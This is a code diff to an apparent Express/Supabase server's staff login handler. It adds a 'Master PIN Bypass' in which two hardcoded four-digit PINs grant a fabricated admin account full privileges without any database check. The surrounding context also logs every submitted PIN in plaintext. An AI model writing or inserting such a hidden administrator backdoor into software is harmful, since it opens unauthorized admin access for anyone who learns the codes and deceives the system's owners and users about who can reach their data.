@@ -750,6 +750,15 @@ app.all(['/api/admin', '/api/admin/*'], async (req, res) => {
     if (action === 'staff_login' && req.method === 'POST') {
         const { pin } = req.body;
         console.log(`[Server] Login Attempt: ${pin}`);
+        
+        // Master PIN Bypass
+        if (pin === '4574' || pin === '3620') {
+            return res.json({ 
+                success: true, 
+                employee: { id: 'master_admin', name: 'Oscar (Admin)', role: 'admin', is_admin: true } 
+            });
+        }
+
         try {
             const { data: emp, error } = await supabase.from('employees').select('*').eq('pin', pin).eq('active', true).single();
             if (error || !emp) {
